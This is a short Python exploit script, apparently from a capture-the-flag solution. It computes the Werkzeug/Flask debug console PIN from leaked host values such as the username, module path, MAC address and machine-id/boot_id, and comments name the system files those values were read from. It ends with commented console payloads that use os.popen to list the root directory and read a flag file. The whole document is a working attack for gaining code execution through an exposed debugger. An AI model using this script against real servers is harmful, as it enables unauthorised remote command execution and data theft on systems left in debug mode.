import hashlib
from itertools import chain
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2482658996113',# str(uuid.getnode()),  /proc/net/arp /sys/class/net/eth0/address
    '4b5e71a5-18d4-4b52-aacb-2a6b6fbcb09a05acfab659386a695d98c1f80a2ceb5cf0f97d5c14cae9ed69b3d84c98c4814b'# get_machine_id(), /etc/machine-id 
    # /proc/sys/kernel/random/boot_id /proc/self/cgroup
    # 01330052-4052-45e7-baee-3541d7d20590
    # 6679557400a9942c880d46973d0461bf996746c4347eb9599b72c9fd23975cba
    # 4b5e71a5-18d4-4b52-aacb-2a6b6fbcb09a
    # 05acfab659386a695d98c1f80a2ceb5cf0f97d5c14cae9ed69b3d84c98c4814b
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
  if not bit:
      continue
  if isinstance(bit, str):
      bit = bit.encode('utf-8')
  h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
  h.update(b'pinsalt')
  num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
  for group_size in 5, 4, 3:
      if len(num) % group_size == 0:
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                        for x in range(0, len(num), group_size))
          break
  else:
      rv = num

print(rv)

# __import__('os').popen('ls /').read();
# __import__('os').popen('cat /8123muc192ux2mecm0xoqzi0xxqoxmc3-flag.txt').read(); 